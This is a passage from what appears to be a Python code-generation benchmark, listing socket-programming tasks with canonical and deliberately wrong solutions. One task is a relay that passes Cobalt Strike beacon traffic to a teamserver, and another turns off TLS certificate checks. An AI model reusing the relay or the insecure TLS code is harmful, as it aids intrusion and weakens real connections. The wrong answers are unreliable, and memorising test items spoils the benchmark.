    "wrong_result": "```python\nimport socket\nimport selectors\nimport queue\nfrom collections import namedtuple\nfrom io import BytesIO\n\nclass Socket:\n    def __init__(self, connect_to, proto='tcp', version=None, headers=None, timeout=None, pool=0, raise_on=(500,), **kwargs):\n        self.connection_pool = queue.Queue(maxsize=pool)\n        self.timeout = timeout\n        self.headers = headers or {}\n        self.raise_on = raise_on\n        self.kwargs = kwargs\n        self.on_unix = hasattr(socket, 'AF_UNIX')\n        self.protocols = {\n            'tcp': (socket.AF_INET, socket.SOCK_STREAM),\n            'udp': (socket.AF_INET, socket.SOCK_DGRAM),\n            'unix_stream': (socket.AF_UNIX, socket.SOCK_STREAM) if self.on_unix else None,\n            'unix_dgram': (socket.AF_UNIX, socket.SOCK_DGRAM) if self.on_unix else None,\n        }\n        self.streams = set(['tcp', 'unix_stream'])\n        self.datagrams = set(['udp', 'unix_dgram'])\n        self.inet = set(['tcp', 'udp'])\n        self.unix = set(['unix_stream', 'unix_dgram']) if self.on_unix else set()\n        self.connection = namedtuple('Connection', ['target', 'proto', 'sockopts'])\n\n        if isinstance(connect_to, tuple):\n            target = connect_to\n        else:\n            target = (connect_to, 80)\n\n        family, socktype = self._get_family_and_type(proto, version)\n        self.connection = self.connection(target=target, proto=proto, sockopts=[(family, socktype)])\n\n    def _get_family_and_type(self, proto, version=None):\n        if proto in self.protocols:\n            return self.protocols[proto]\n        else:\n            raise ValueError(f\"Unsupported protocol: {proto}\")\n\n    def settimeout(self, timeout):\n        self.timeout = timeout\n\n    def setsockopt(self, *sockopts):\n        for opt in sockopts:\n            if isinstance(opt, list) or isinstance(opt, tuple):\n                self.connection.sockopts.extend(opt)\n            else:\n                self.connection.sockopts.append(opt)\n\n    def _register_socket(self):\n        sock = socket.socket(*self.connection.sockopts[-2:])\n        for opt in self.connection.sockopts[:-2]:\n            sock.setsockopt(*opt)\n        if self.timeout is not None:\n            sock.settimeout(self.timeout)\n        return sock\n\n    def _stream_send_and_receive(self, _socket, message, *args, **kwargs):\n        _socket.connect(self.connection.target)\n        _socket.sendall(message.encode())\n        response = BytesIO()\n        while True:\n            data = _socket.recv(4096)\n            if not data:\n                break\n            response.write(data)\n        return response.getvalue()\n\n    def _dgram_send_and_receive(self, _socket, message, buffer_size=4096, *args):\n        _socket.connect(self.connection.target)\n        _socket.send(message.encode())\n        response = BytesIO()\n        while True:\n            try:\n                data, addr = _socket.recvfrom(buffer_size)\n                response.write(data)\n                if not data:\n                    break\n            except socket.error:\n                break\n        return response.getvalue()\n\n    def request(self, message, timeout=False, *args, **kwargs):\n        if self.connection.proto in self.streams:\n            send_func = self._stream_send_and_receive\n        elif self.connection.proto in self.datagrams:\n            send_func = self._dgram_send_and_receive\n        else:\n            raise ValueError(\"Unsupported protocol type\")\n\n        if not self.connection_pool.empty():\n            conn = self.connection_pool.get()\n        else:\n            conn = self._register_socket()\n\n        result = send_func(conn, message, *args, **kwargs)\n        if timeout:\n            conn.settimeout(timeout)\n        self.connection_pool.put(conn)\n        return result\n```"
  },
  {
    "Task_id": 376,
    "Instruction": "Task Description: Create a thread-safe TCP socket wrapper class that handles connection management, data transmission, and SSL/TLS encryption with proper resource cleanup.\n\nClass Description: SafeStreamSocket is a robust socket wrapper that provides safe connection handling, unique socket identification, and SSL/TLS capabilities. It manages socket lifecycle including proper cleanup and supports both IPv4 and Unix domain sockets.\n\nAttributes:\n_id: [int] - Unique identifier for the socket instance\n_dup_sock: [socket.socket] - Duplicate socket used during SSL/TLS handshake\n_name: [str] - Optional name identifier for the socket\n_sock: [socket.socket] - Main socket connection object\n_finalizer: [weakref.finalize] - Weak reference finalizer for cleanup\n_id_numbers: [class attribute, list[int]] - Tracks all active socket IDs\n_n: [class attribute, list[int]] - Counter for generating unique IDs\n\nMethods:\n__init__: [constructor](addr: Union[str, Tuple[str, int], socket.socket, Any]) -> None - Initializes socket connection with the given address\n_acquire_uid: [_acquire_uid]() -> int - Generates a unique ID for the socket instance\n_connect: [_connect](addr: Union[str, Tuple[str, int], socket.socket, Any]) -> socket.socket - Establishes connection to the specified address\n_cleanup: [_cleanup]() -> None - Performs cleanup operations when socket is closed\n_release_uid: [_release_uid](id: int) -> None - Releases the socket ID when closed\nclose: [close]() -> None - Closes the socket connection\nclosed: [property]() -> bool - Returns whether socket is closed\nid: [property]() -> int - Returns socket ID\nname: [property]() -> str - Gets socket name\nname: [setter](new_name: str) -> None - Sets socket name\nget_socket: [get_socket]() -> socket.socket - Returns underlying socket object\nrecv: [recv](bufsize: int = 4096) -> bytes - Receives data from socket\nrecvall: [recvall](size: int) -> bytearray - Receives exact amount of data\nsendall: [sendall](data: Union[bytes, bytearray]) -> int - Sends all data through socket\nswitch_to_ssl: [switch_to_ssl](pemfile: str) -> None - Upgrades connection to SSL/TLS\n__enter__: [__enter__]() -> SafeStreamSocket - Context manager entry\n__exit__: [__exit__](*args) -> None - Context manager exit",
    "Canonical_solution": "import logging\nimport os\nimport socket\nimport ssl\nimport threading\nimport typing\nimport weakref\nfrom typing import Any, Union\n\nclass SafeStreamSocket:\n    def __init__(self, addr: Union[str, typing.Tuple[str, int], socket.socket, Any]):\n        self._id = self._acquire_uid()\n        self._dup_sock = None\n        self._name = None\n        self._sock = self._connect(addr)\n        self._finalizer = weakref.finalize(self, self._cleanup)\n\n    def _acquire_uid(self) -> int:\n        with threading.Lock():\n            self._id_numbers.append(self._n[0])\n            _id = self._n[0]\n            self._n[0] += 1\n        logging.debug(\"Opening socket: id=%d\", _id)\n        return _id\n\n    def _connect(self, addr: Union[str, typing.Tuple[str, int], socket.socket, Any]) -> socket.socket:\n        if isinstance(addr, socket.socket):\n            return addr\n        if isinstance(addr, str):\n            if ':' in addr:\n                host, port = addr.split(\":\", 1)\n                addr = (host, int(port))\n                family = socket.AF_INET\n            elif os.path.exists(addr):\n                family = socket.AF_UNIX\n            else:\n                raise SocketError(f\"socket unix:{addr} unable to connect\")\n        else:\n            family = socket.AF_INET\n        sock = socket.socket(family, socket.SOCK_STREAM)\n        sock.connect(addr)\n        return sock\n\n    def _cleanup(self):\n        self._release_uid(self.id)\n        sock = self._dup_sock or self._sock\n        try:\n            sock.shutdown(socket.SHUT_RDWR)\n        except OSError:\n            pass\n        sock.close()\n\n    def _release_uid(self, id: int):\n        try:\n            self._id_numbers.remove(id)\n        except ValueError:\n            pass\n        logging.debug(\"Closing socket, id=%d\", id)\n\n    def close(self):\n        self._finalizer()\n\n    @property\n    def closed(self) -> bool:\n        return not self._finalizer.alive\n\n    @property\n    def id(self) -> int:\n        return self._id\n\n    @property\n    def name(self) -> str:\n        return self._name\n\n    @name.setter\n    def name(self, new_name: str):\n        self._name = new_name\n\n    def get_socket(self) -> socket.socket:\n        return self._sock\n\n    def recv(self, bufsize: int = 4096) -> bytes:\n        try:\n            return self._sock.recv(bufsize)\n        except socket.timeout as e:\n            raise SocketError(\"socket timeout\") from e\n        except ssl.SSLError as e:\n            raise SocketError(\"ssl error\") from e\n        except Exception as e:\n            raise SocketError(\"socket error\") from e\n\n    def recvall(self, size: int) -> bytearray:\n        buf = bytearray()\n        while len(buf) < size:\n            chunk = self.recv(size-len(buf))\n            if not chunk:\n                raise SocketError(\"recvall: socket connection broken\")\n            buf.extend(chunk)\n        return buf\n\n    def sendall(self, data: Union[bytes, bytearray]) -> int:\n        try:\n            return self._sock.sendall(data)\n        except Exception as e:\n            raise SocketError(\"sendall error\") from e\n\n    def switch_to_ssl(self, pemfile):\n        context = ssl.SSLContext(ssl.PROTOCOL_TLS)\n        try:\n            context.verify_mode = ssl.CERT_NONE\n            context.set_ciphers(\"ALL:@SECLEVEL=0\")\n        except ssl.SSLError:\n            pass\n        self._dup_sock = self._sock.dup()\n        context.load_cert_chain(pemfile, keyfile=pemfile)\n        context.check_hostname = False\n        self._sock = context.wrap_socket(self._sock, server_hostname=\"iphone.localhost\")\n\n    def __enter__(self):\n        return self\n\n    def __exit__(self, *args):\n        self.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport ssl\nimport weakref\nfrom typing import Union, Tuple, Any\n\nclass SafeStreamSocket:\n    _id_numbers = []\n    _n = [0]\n\n    def __init__(self, addr: Union[str, Tuple[str, int], socket.socket, Any] = None):\n        self._id = self._acquire_uid()\n        self._dup_sock = None\n        self._name = \"\"\n        self._sock = None\n        self._finalizer = weakref.finalize(self, self._cleanup)\n        if addr is not None:\n            self._connect(addr)\n\n    def _acquire_uid(self) -> int:\n        with self._lock():\n            id_num = self._n[0]\n            self._n[0] += 1\n            self._id_numbers.append(id_num)\n        return id_num\n\n    def _connect(self, addr: Union[str, Tuple[str, int], socket.socket, Any]) -> socket.socket:\n        if isinstance(addr, (str, tuple)):\n            sock = socket.create_connection(addr)\n        elif isinstance(addr, socket.socket):\n            sock = addr\n        else:\n            raise ValueError(\"Invalid address type\")\n        self._sock = sock\n        return sock\n\n    def _cleanup(self) -> None:\n        self._release_uid(self._id)\n        if self._dup_sock:\n            self._dup_sock.close()\n        if self._sock:\n            self._sock.close()\n\n    def _release_uid(self, id: int) -> None:\n        with self._lock():\n            self._id_numbers.remove(id)\n\n    def close(self) -> None:\n        self._finalizer.detach()\n        self._cleanup()\n\n    @property\n    def closed(self) -> bool:\n        return self._sock is None or self._sock.fileno() == -1\n\n    @property\n    def id(self) -> int:\n        return self._id\n\n    @property\n    def name(self) -> str:\n        return self._name\n\n    @name.setter\n    def name(self, new_name: str) -> None:\n        self._name = new_name\n\n    def get_socket(self) -> socket.socket:\n        return self._sock\n\n    def recv(self, bufsize: int = 4096) -> bytes:\n        return self._sock.recv(bufsize)\n\n    def recvall(self, size: int) -> bytearray:\n        data = bytearray()\n        while len(data) < size:\n            packet = self._sock.recv(size - len(data))\n            if not packet:\n                return b''\n            data.extend(packet)\n        return data\n\n    def sendall(self, data: Union[bytes, bytearray]) -> int:\n        return self._sock.sendall(data)\n\n    def switch_to_ssl(self, pemfile: str) -> None:\n        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)\n        context.load_cert_chain(pemfile)\n        self._dup_sock = self._sock.dup()\n        self._sock = context.wrap_socket(self._sock, server_side=False)\n\n    def __enter__(self) -> 'SafeStreamSocket':\n        return self\n\n    def __exit__(self, *args) -> None:\n        self.close()\n\n    @classmethod\n    def _lock(cls):\n        from threading import Lock\n        if not hasattr(cls, '_lock_obj'):\n            cls._lock_obj = Lock()\n        return cls._lock_obj\n```"
  },
  {
    "Task_id": 38,
    "Instruction": "Task Description: Implement a function that handles Server-Sent Events (SSE) from an HTTP POST request, processes the incoming data streams, and yields appropriate message objects or raises errors when encountered.\n\nFunction Description: The function `_sse_post` establishes an SSE connection to a specified URL, sends a POST request with provided data and headers, and processes the incoming event stream. It handles different message types by yielding appropriate message objects (ReasoningMessage, ToolCallMessage, ToolReturnMessage, LettaUsageStatistics) or stream status updates (MessageStreamStatus). It also handles errors, including context window errors and JSON parsing errors, by raising appropriate exceptions.\n\nInput:\n- url: str - The URL to which the POST request will be sent.\n- data: dict - The JSON data to be sent in the POST request body.\n- headers: dict - The headers to be included in the POST request.\n\nOutput:\n- Generator[LettaStreamingResponse, None, None] - A generator that yields objects of type LettaStreamingResponse (which can be ReasoningMessage, ToolCallMessage, ToolReturnMessage, LettaUsageStatistics, or MessageStreamStatus) as the events are received from the server. Raises LLMError for context window errors or other appropriate exceptions for other errors.",
    "Canonical_solution": "import json\nfrom typing import Generator\nimport httpx\nfrom httpx_sse import SSEError, connect_sse\nfrom letta.constants import OPENAI_CONTEXT_WINDOW_ERROR_SUBSTRING\nfrom letta.errors import LLMError\nfrom letta.schemas.enums import MessageStreamStatus\nfrom letta.schemas.letta_message import ReasoningMessage, ToolCallMessage, ToolReturnMessage\nfrom letta.schemas.letta_response import LettaStreamingResponse\nfrom letta.schemas.usage import LettaUsageStatistics\n\ndef _sse_post(url: str, data: dict, headers: dict) -> Generator[LettaStreamingResponse, None, None]:\n    with httpx.Client() as client:\n        with connect_sse(client, method=\"POST\", url=url, json=data, headers=headers) as event_source:\n            if not event_source.response.is_success:\n                response_bytes = event_source.response.read()\n                response_dict = json.loads(response_bytes.decode(\"utf-8\"))\n                error_message = response_dict[\"error\"][\"message\"]\n                if OPENAI_CONTEXT_WINDOW_ERROR_SUBSTRING in error_message:\n                    raise LLMError(error_message)\n                event_source.response.raise_for_status()\n\n            try:\n                for sse in event_source.iter_sse():\n                    if sse.data in [status.value for status in MessageStreamStatus]:\n                        yield MessageStreamStatus(sse.data)\n                    else:\n                        chunk_data = json.loads(sse.data)\n                        if \"reasoning\" in chunk_data:\n                            yield ReasoningMessage(**chunk_data)\n                        elif \"tool_call\" in chunk_data:\n                            yield ToolCallMessage(**chunk_data)\n                        elif \"tool_return\" in chunk_data:\n                            yield ToolReturnMessage(**chunk_data)\n                        elif \"step_count\" in chunk_data:\n                            yield LettaUsageStatistics(**chunk_data)\n                        else:\n                            raise ValueError(f\"Unknown message type in chunk_data: {chunk_data}\")\n\n            except SSEError as e:\n                if \"application/json\" in str(e):\n                    response = client.post(url=url, json=data, headers=headers)\n                    if response.headers[\"Content-Type\"].startswith(\"application/json\"):\n                        error_details = response.json()\n                raise e\n\n            except Exception as e:\n                raise e",
    "Code_level": "Function-level",
    "FSMID_for_test": 58,
    "wrong_result": "```python\nimport requests\nfrom typing import Generator, Dict, Any\nimport json\n\nclass LLMError(Exception):\n    pass\n\nclass ReasoningMessage:\n    def __init__(self, content: str):\n        self.content = content\n\nclass ToolCallMessage:\n    def __init__(self, tool_name: str, arguments: Dict[str, Any]):\n        self.tool_name = tool_name\n        self.arguments = arguments\n\nclass ToolReturnMessage:\n    def __init__(self, result: Any):\n        self.result = result\n\nclass LettaUsageStatistics:\n    def __init__(self, tokens_used: int, cost: float):\n        self.tokens_used = tokens_used\n        self.cost = cost\n\nclass MessageStreamStatus:\n    def __init__(self, status: str, message: str):\n        self.status = status\n        self.message = message\n\nclass LettaStreamingResponse:\n    pass\n\ndef _sse_post(url: str, data: dict, headers: dict) -> Generator[LettaStreamingResponse, None, None]:\n    with requests.post(url, json=data, headers=headers, stream=True) as response:\n        if response.status_code != 200:\n            raise LLMError(f\"Server returned non-200 status code: {response.status_code}\")\n\n        buffer = \"\"\n        for line in response.iter_lines(decode_unicode=True):\n            if not line:\n                continue\n            buffer += line + \"\\n\"\n            if line.endswith(\"\\n\\n\"):\n                try:\n                    event_data = json.loads(buffer.strip())\n                    event_type = event_data.get(\"type\")\n                    content = event_data.get(\"content\", {})\n                    if event_type == \"reasoning\":\n                        yield ReasoningMessage(content[\"message\"])\n                    elif event_type == \"tool_call\":\n                        yield ToolCallMessage(content[\"tool_name\"], content[\"arguments\"])\n                    elif event_type == \"tool_return\":\n                        yield ToolReturnMessage(content[\"result\"])\n                    elif event_type == \"usage_statistics\":\n                        yield LettaUsageStatistics(content[\"tokens_used\"], content[\"cost\"])\n                    elif event_type == \"status\":\n                        yield MessageStreamStatus(content[\"status\"], content[\"message\"])\n                    elif event_type == \"error\":\n                        error_message = content.get(\"message\", \"Unknown error occurred.\")\n                        if \"context window\" in error_message.lower():\n                            raise LLMError(error_message)\n                        else:\n                            raise Exception(error_message)\n                    else:\n                        yield MessageStreamStatus(\"unknown_event\", f\"Received unknown event type: {event_type}\")\n                except json.JSONDecodeError as e:\n                    raise Exception(f\"Failed to parse JSON from SSE stream: {e}\")\n                finally:\n                    buffer = \"\"\n```"
  },
  {
    "Task_id": 380,
    "Instruction": "Task Description: Implement a TCP server that can handle multiple client connections, process incoming packets, and send replies asynchronously using Python's socket module and Scapy's networking capabilities.\n\nClass Description: AnsweringMachineTCP is a TCP server implementation that listens on a specified port, accepts client connections, and processes incoming packets using Scapy's packet handling capabilities. It supports asynchronous packet sniffing and reply generation for each connected client.\n\nAttributes:\nport: [int] - The port number on which the server listens for incoming connections\ncls: [Type[Packet]] - The Scapy packet class used for parsing incoming data\noptsniff: [dict] - Dictionary of additional options for the sniffer configuration\nsniffer: [threading.Thread] - Background thread running the sniffing process\n\nMethods:\n__init__(port=80, cls=conf.raw_layer, **kargs) -> [None] - Initializes the answering machine with specified port, packet class, and additional options\nclose() -> [None] - Closes all resources (placeholder implementation)\nreply(pkt, send_function=None, address=None) -> [None] - Processes incoming packets and sends replies if appropriate\nsniff() -> [None] - Main server loop that accepts connections and starts sniffers for each client\nsniff_bg() -> [None] - Starts the sniffing process in a background thread\nis_request(req) -> [bool] - Determines if a packet should be processed (default always True)\nmake_reply(req, address=None) -> [Packet] - Generates a reply packet (default returns input packet)\nsend_reply(reply, send_function=None) -> [None] - Sends the generated reply to the client",
    "Canonical_solution": "import socket\nfrom typing import Optional, Type, Any\nfrom scapy.arch import get_if_addr\nfrom scapy.config import conf\nfrom scapy.packet import Packet\nfrom scapy.supersocket import StreamSocket\nimport functools\nfrom scapy.sendrecv import AsyncSniffer\n\nclass AnsweringMachineTCP:\n    \"\"\"\n    An answering machine that use the classic socket.socket to\n    answer multiple TCP clients\n    \"\"\"\n    TYPE = socket.SOCK_STREAM\n\n    def __init__(self, port=80, cls=conf.raw_layer, **kargs):\n        self.port = port\n        self.cls = cls\n        self.optsniff = kargs\n\n    def close(self):\n        pass\n\n    def reply(self, pkt, send_function=None, address=None):\n        if not self.is_request(pkt):\n            return\n        if address:\n            reply = self.make_reply(pkt, address=address)\n        else:\n            reply = self.make_reply(pkt)\n        if not reply:\n            return\n        if send_function:\n            self.send_reply(reply, send_function=send_function)\n        else:\n            self.send_reply(reply)\n\n    def sniff(self):\n        ssock = socket.socket(socket.AF_INET, self.TYPE)\n        try:\n            ssock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n        except OSError:\n            pass\n        ssock.bind(\n            (get_if_addr(self.optsniff.get(\"iface\", conf.iface)), self.port))\n        ssock.listen()\n        sniffers = []\n        try:\n            while True:\n                clientsocket, address = ssock.accept()\n                sock = StreamSocket(clientsocket, self.cls)\n                optsniff = self.optsniff.copy()\n                optsniff[\"prn\"] = functools.partial(self.reply,\n                                                    send_function=sock.send,\n                                                    address=address)\n                del optsniff[\"iface\"]\n                sniffer = AsyncSniffer(opened_socket=sock, **optsniff)\n                sniffer.start()\n                sniffers.append((sniffer, sock))\n        finally:\n            for (sniffer, sock) in sniffers:\n                try:\n                    sniffer.stop()\n                except Exception:\n                    pass\n                sock.close()\n            self.close()\n            ssock.close()\n\n    def sniff_bg(self):\n        self.sniffer = threading.Thread(target=self.sniff)\n        self.sniffer.start()\n\n    def is_request(self, req):\n        return 1\n\n    def make_reply(self, req, address=None):\n        return req\n\n    def send_reply(self, reply, send_function=None):\n        if send_function:\n            send_function(reply)",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nfrom socket import *\nimport threading\nfrom scapy.all import *\nfrom scapy.packet import Packet\nfrom scapy.config import conf\n\nclass AnsweringMachineTCP:\n    def __init__(self, port=80, cls=conf.raw_layer, **kargs):\n        self.port = port\n        self.cls = cls\n        self.optsniff = kargs\n        self.sniffer = None\n        self.server_socket = socket(AF_INET, SOCK_STREAM)\n        self.server_socket.bind(('0.0.0.0', self.port))\n        self.server_socket.listen(5)\n\n    def close(self):\n        self.server_socket.close()\n\n    def reply(self, pkt, send_function=None, address=None):\n        if self.is_request(pkt):\n            reply_pkt = self.make_reply(pkt, address)\n            self.send_reply(reply_pkt, send_function)\n\n    def sniff(self):\n        while True:\n            client_socket, addr = self.server_socket.accept()\n            client_thread = threading.Thread(target=self.handle_client, args=(client_socket, addr))\n            client_thread.start()\n\n    def sniff_bg(self):\n        self.sniffer = threading.Thread(target=self.sniff)\n        self.sniffer.start()\n\n    def is_request(self, req):\n        return True\n\n    def make_reply(self, req, address=None):\n        return req\n\n    def send_reply(self, reply, send_function=None):\n        if send_function:\n            send_function(reply)\n        else:\n            reply.show()\n\n    def handle_client(self, client_socket, address):\n        while True:\n            try:\n                data = client_socket.recv(65535)\n                if not data:\n                    break\n                pkt = self.cls(data)\n                self.reply(pkt, send_function=client_socket.sendall, address=address)\n            except Exception as e:\n                print(f\"Error handling client {address}: {e}\")\n                break\n        client_socket.close()\n```"
  },
  {
    "Task_id": 384,
    "Instruction": "Task Description: Implement a TCP server class that receives OAuth tokens through a local socket connection, handling the incoming HTTP request and extracting the authorization code or error message.\n\nClass Description: OAuthTokenReceiver is a class that creates a TCP server to listen for OAuth token responses on a specified local port. It handles the HTTP response, extracts the authorization code, and manages error cases.\n\nAttributes:\nport: int - The local port number on which the server will listen for incoming OAuth token responses (default: 31337)\n\nMethods:\nreceive_oauth_token: receive_oauth_token() -> str - Listens for an incoming connection, receives the OAuth token response, sends an HTTP success response, and returns the extracted authorization code. Raises an exception if the response contains an error description.",
    "Canonical_solution": "import socket\nimport re\nimport urllib.parse\n\nclass OAuthTokenReceiver:\n    def __init__(self, port=31337):\n        self.port = port\n\n    def receive_oauth_token(self):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.bind(('127.0.0.1', self.port))\n        sock.listen(1)\n        conn, addr = sock.accept()\n        data = conn.recv(1024)\n        conn.sendall('HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><head><title>Recon-ng</title></head><body>Response received. Return to Recon-ng.</body></html>')\n        conn.close()\n        \n        if 'error_description' in data:\n            error = urllib.parse.unquote_plus(re.search(r'error_description=([^\\s&]*)', data).group(1))\n            raise Exception(error)\n        \n        authorization_code = re.search(r'code=([^\\s&]*)', data).group(1)\n        return authorization_code",
    "Code_level": "Class-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport socket\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom urllib.parse import urlparse, parse_qs\n\n\nclass OAuthTokenReceiver:\n    def __init__(self, port: int = 31337):\n        self.port = port\n\n    def receive_oauth_token(self) -> str:\n        class RequestHandler(BaseHTTPRequestHandler):\n            code = None\n            error = None\n\n            def do_GET(self):\n                parsed_url = urlparse(self.path)\n                query_params = parse_qs(parsed_url.query)\n                if 'error' in query_params:\n                    self.error = query_params['error'][0]\n                elif 'code' in query_params:\n                    self.code = query_params['code'][0]\n                else:\n                    self.send_error(400, \"Invalid request\")\n                    return\n\n                self.send_response(200)\n                self.send_header('Content-type', 'text/html')\n                self.end_headers()\n                self.wfile.write(b\"Authorization successful\")\n\n        server_address = ('localhost', self.port)\n        httpd = HTTPServer(server_address, RequestHandler)\n        httpd.handle_request()\n\n        if RequestHandler.error:\n            raise Exception(f\"OAuth error: {RequestHandler.error}\")\n        return RequestHandler.code\n```"
  },
  {
    "Task_id": 386,
    "Instruction": "Task Description: Implement a TCP server that handles client connections, processes incoming data, and interacts with a teamserver through HTTP requests. The server should be able to read and write data based on client requests.\n\nFunction Description: The function `cc2_tcp_server` creates a TCP server that listens for client connections on a specified port. It processes incoming messages to either read data from or write data to a teamserver via HTTP requests. The server handles each client connection in a loop, processing the data and closing the connection afterward.\n\nInput: None (The function binds to a hardcoded IP address and port, and processes incoming client connections.)\n\nOutput: None (The function sends responses to clients but does not return any value.)\n\n---\n\nTask Description: Implement helper functions to support the TCP server's operations, including reading from and writing to a teamserver, parsing raw data, and extracting beacon data.\n\nFunction Description: The function `read_cs_teamserver` sends an HTTP GET request to a teamserver with metadata and extracts beacon data from the response. The function `write_cs_teamserver` sends an HTTP POST request to a teamserver with metadata. The function `parseRawData` splits raw data into a beacon ID and metadata. The function `find_beacon_data` extracts beacon data from a string based on prefix and suffix markers.\n\nInput:\n- `read_cs_teamserver`: `metadata` (str) - The metadata to include in the HTTP GET request.\n- `write_cs_teamserver`: `id` (str) - The beacon ID to include in the HTTP POST request URL; `metadata` (str) - The metadata to include in the HTTP POST request body.\n- `parseRawData`: `rawData` (str) - The raw data string to parse.\n- `find_beacon_data`: `prefix` (str) - The prefix marker for beacon data; `suffix` (str) - The suffix marker for beacon data; `data` (str) - The string to search for beacon data.\n\nOutput:\n- `read_cs_teamserver`: `beacon_data` (str) - The extracted beacon data from the HTTP response.\n- `write_cs_teamserver`: None (The function sends an HTTP POST request but does not return any value.)\n- `parseRawData`: `bid` (str) - The extracted beacon ID; `metadata` (str) - The extracted metadata.\n- `find_beacon_data`: `beacon_data` (str) - The extracted beacon data, or an empty string if not found.",
    "Canonical_solution": "import socket\nimport requests\n\ndef cc2_tcp_server():\n    sockobj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sockobj.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)\n    sockobj.bind(('127.0.0.1', 7777))\n    sockobj.listen(1000)\n\n    while True:\n        connection, address = sockobj.accept()\n        msgHeader = connection.recv(7)\n        if msgHeader == 'read|||':\n            data = connection.recv(10024)\n            metadata = read_cs_teamserver(data)\n            if len(metadata) > 0:\n                connection.send(metadata)\n        elif msgHeader == 'write||':\n            rawData = connection.recv(10024)\n            bid, metadata = parseRawData(rawData)\n            if len(metadata) > 0 and len(bid) > 0:\n                write_cs_teamserver(bid, metadata)\n        connection.close()\n\ndef read_cs_teamserver(metadata):\n    headers = { \"HOST\": \"www.google.com\",\n                \"Referer\": \"http://www.google.com/\",\n                \"Accept\": \"accccccc\",\n                \"User-Agent\": \"cc2_rebind_protocol_get_send\",\n                \"Cookie\": \"SESSION={}\".format(metadata),\n                \"Connection\": \"cc2_rebind_protocol_get_send\"\n    }\n    res = requests.get(\"http://127.0.0.1:443/aaaaaaaaa\", headers=headers)\n    start = \"ffffffff1\"\n    end = \"eeeeeeee2\"\n    beacon_data = find_beacon_data(start, end, res.content)\n    return beacon_data\n\ndef write_cs_teamserver(id, metadata):\n    headers = { \"HOST\": \"www.google.com\",\n                \"Referer\": \"http://www.google.com/\",\n                \"Accept\": \"accccccc\",\n                \"User-Agent\": \"cc2_rebind_protocol_post_send\",\n                \"Connection\": \"keep-alive\",\n                \"Content-Length\": \"{}\".format(len(metadata))\n    }\n    res = requests.post(\"http://127.0.0.1:443/bbbbbbbbb?SESSION={}\".format(id), headers=headers, data=metadata)\n\ndef parseRawData(rawData):\n    split = '->|<-'\n    split_index = rawData.find(split)\n    bid = rawData[:split_index]\n    metadata = rawData[len(split)+split_index:]\n    return bid,metadata\n\ndef find_beacon_data(prefix, suffix, data):\n    s_index = data.find(prefix) + 1\n    s_end = data.find(suffix)\n    beacon_data = ''\n    if (s_index > 0 and s_end > 0 and (s_index + len(prefix) + 1) != s_end:\n        beacon_data = data[s_index + len(prefix):s_end]\n    return beacon_data",
    "Code_level": "Function-level",
    "FSMID_for_test": 66,
    "wrong_result": "```python\nimport socket\nimport http.client\nimport threading\n\ndef find_beacon_data(prefix, suffix, data):\n    start = data.find(prefix)\n    if start == -1:\n        return \"\"\n    start += len(prefix)\n    end = data.find(suffix, start)\n    if end == -1:\n        return \"\"\n    return data[start:end]\n\ndef parseRawData(rawData):\n    parts = rawData.split(\":\", 1)\n    if len(parts) < 2:\n        return \"\", \"\"\n    bid = parts[0]\n    metadata = parts[1]\n    return bid, metadata\n\ndef read_cs_teamserver(metadata):\n    conn = http.client.HTTPConnection(\"teamserver.com\")\n    conn.request(\"GET\", f\"/read?metadata={metadata}\")\n    response = conn.getresponse()\n    data = response.read().decode()\n    conn.close()\n    beacon_data = find_beacon_data(\"<BEACON>\", \"</BEACON>\", data)\n    return beacon_data\n\ndef write_cs_teamserver(id, metadata):\n    conn = http.client.HTTPConnection(\"teamserver.com\")\n    headers = {\"Content-type\": \"application/x-www-form-urlencoded\"}\n    conn.request(\"POST\", f\"/write?id={id}\", f\"metadata={metadata}\", headers)\n    conn.getresponse()\n    conn.close()\n\ndef handle_client(client_socket):\n    try:\n        data = client_socket.recv(4096).decode()\n        bid, metadata = parseRawData(data)\n        if not bid or not metadata:\n            client_socket.send(b\"Invalid format\")\n            client_socket.close()\n            return\n        beacon_data = read_cs_teamserver(metadata)\n        if beacon_data:\n            client_socket.send(beacon_data.encode())\n        else:\n            write_cs_teamserver(bid, metadata)\n            client_socket.send(b\"Request processed\")\n    except Exception as e:\n        pass\n    finally:\n        client_socket.close()\n\ndef cc2_tcp_server():\n    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    server.bind((\"0.0.0.0\", 9000))\n    server.listen(5)\n    print(\"TCP Server Listening on port 9000...\")\n    while True:\n        client_sock, addr = server.accept()\n        client_handler = threading.Thread(target=handle_client, args=(client_sock,))\n        client_handler.start()\n```"
  },
  {
    "Task_id": 387,
    "Instruction": "Task Description: Create a TCP server that collects and serves Jetson device statistics using the jtop library, with optional HTTP response formatting.\n\nFunction Description: The function establishes a TCP server that listens for incoming connections. When a client connects, it retrieves system statistics from the Jetson device using jtop, formats them as JSON, and sends them to the client. The function can optionally wrap the JSON data in a basic HTTP response.\n\nInput:\n- host (str, optional): IP address to bind the server to (default: \"127.0.0.1\")\n- port (int, optional): Port number to listen on (default: 65432)\n- http (bool, optional): Flag to enable HTTP response formatting (default: False)\n\nOutput: None (The function runs indefinitely until interrupted or an error occurs, sending data to connected clients but not returning any value)",
